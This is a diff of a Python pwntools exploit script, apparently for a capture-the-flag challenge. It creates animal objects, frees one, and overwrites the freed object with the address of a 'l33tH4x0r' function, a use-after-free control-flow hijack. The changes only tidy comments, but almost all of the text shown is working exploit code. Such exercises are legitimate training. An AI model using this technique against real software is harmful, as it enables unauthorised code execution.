@@ -12,7 +12,7 @@ if not debug:
 		print p.recvuntil('want:')
 		p.sendline('3') # type
 		print p.recvuntil('tiger:')
-		p.sendline(p64(l33tH4x0r_addr))#p64(l33tH4x0r_addr))
+		p.sendline(p64(l33tH4x0r_addr))
 
 		# make bear
 		print p.recvuntil('choice:')
@@ -20,7 +20,7 @@ if not debug:
 		print p.recvuntil('want:')
 		p.sendline('3') # type
 		print p.recvuntil('name:')
-		p.sendline('AAAA'*2 + '\x90'*3)# '\x0E\x09\x40')#p64(l33tH4x0r_addr))
+		p.sendline('AAAA'*2 + '\x90'*3)
 
 		# delete first	
 		print p.recvuntil('choice:')
@@ -34,12 +34,7 @@ if not debug:
 		print p.recvuntil('want:', timeout=1)
 		p.sendline('3') # type
 		print p.recvuntil('tiger:', timeout=1)
-		p.sendline(p64(l33tH4x0r_addr))#p64(l33tH4x0r_addr))
-
-		# print p.recvuntil('choice:')
-		# p.sendline('4') # bear
-		# print p.recvuntil('delete?')
-		# p.sendline('1') # type
+		p.sendline(p64(l33tH4x0r_addr))
 
 		# pwnMe
 		print p.recvuntil('choice:')
@@ -62,7 +57,7 @@ else:
 	print p.recvuntil('want:', timeout=1)
 	p.sendline('3') # type
 	print p.recvuntil('tiger:', timeout=1)
-	p.sendline(p64(l33tH4x0r_addr))#p64(l33tH4x0r_addr))
+	p.sendline(p64(l33tH4x0r_addr))
 
 	# make bear
 	print p.recvuntil('choice:', timeout=1)
@@ -70,7 +65,7 @@ else:
 	print p.recvuntil('want:', timeout=1)
 	p.sendline('3') # type
 	print p.recvuntil('name:')
-	p.sendline('AAAA'*2 + '\x90'*3)# '\x0E\x09\x40')#p64(l33tH4x0r_addr))
+	p.sendline('AAAA'*2 + '\x90'*3)
 
 	# delete first	
 	print p.recvuntil('choice:')
@@ -84,12 +79,7 @@ else:
 	print p.recvuntil('want:', timeout=1)
 	p.sendline('3') # type
 	print p.recvuntil('tiger:', timeout=1)
-	p.sendline(p64(l33tH4x0r_addr))#p64(l33tH4x0r_addr))
-
-	# print p.recvuntil('choice:')
-	# p.sendline('4') # bear
-	# print p.recvuntil('delete?')
-	# p.sendline('1') # type
+	p.sendline(p64(l33tH4x0r_addr))
 
 	# pwnMe
 	print p.recvuntil('choice:')
